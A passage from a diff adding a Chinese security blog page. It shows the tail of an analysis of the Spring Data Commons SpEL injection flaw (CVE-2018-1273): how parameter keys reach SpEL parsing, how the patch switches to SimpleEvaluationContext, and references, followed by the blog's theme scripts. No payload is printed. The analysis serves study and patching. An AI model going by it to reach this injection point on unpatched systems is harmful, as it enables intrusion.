class="keyword">return</span> proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最后将传入的参数进行了绑定。之前触发漏洞的地方<code>setPropertyValue</code>就是在设置参数的值。</p>
+<p> 把传入参数的key值取出然后进行了SPEL表达式的解析。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/19.png" alt></p>
+<p>从而触发了漏洞。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></p>
+<p>可以看到将之前的<code>StandardEvaluationContext</code>替换成了<code>SimpleEvaluationContext</code></p>
+<p><code>SimpleEvaluationContext</code>对于权限的限制更为严格，能够进行的操作更少。只支持一些简单的Map结构。</p>
+<p>再次执行POC时可以看到，虽然参数还是传入了<code>context</code>中，但是执行<code>setValue</code>的时候会抛出异常，从而无法进行攻击。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/SPEL表达式注入-入门篇/20.png" alt></p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
+<li><a href="https://wsygoogol.github.io/2016/07/15/Spring-Boot%E6%A1%86%E6%9E%B6SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://wsygoogol.github.io/2016/07/15/Spring-Boot%E6%A1%86%E6%9E%B6SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></li>
+<li><a href="https://www.cnblogs.com/litlife/archive/2018/12/27/10183137.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/archive/2018/12/27/10183137.html</a></li>
+<li><a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a></li>
+<li><a href="https://blog.csdn.net/fnmsd/article/details/84556522" target="_blank" rel="noopener">https://blog.csdn.net/fnmsd/article/details/84556522</a></li>
+<li><a href="http://blog.nsfocus.net/cve-2018-1273-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2018-1273-analysis/</a></li>
+<li><a href="https://www.melodia.pw/?p=959" target="_blank" rel="noopener">https://www.melodia.pw/?p=959</a></li>
+</ul>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/05/Weblogic-XMLDecoder反序列化学习/" data-toggle="tooltip" data-placement="top" title="Weblogic XMLDecoder反序列化学习">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/01/Java反序列之从萌新到菜鸟/" data-toggle="tooltip" data-placement="top" title="Java反序列之从萌新到菜鸟">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
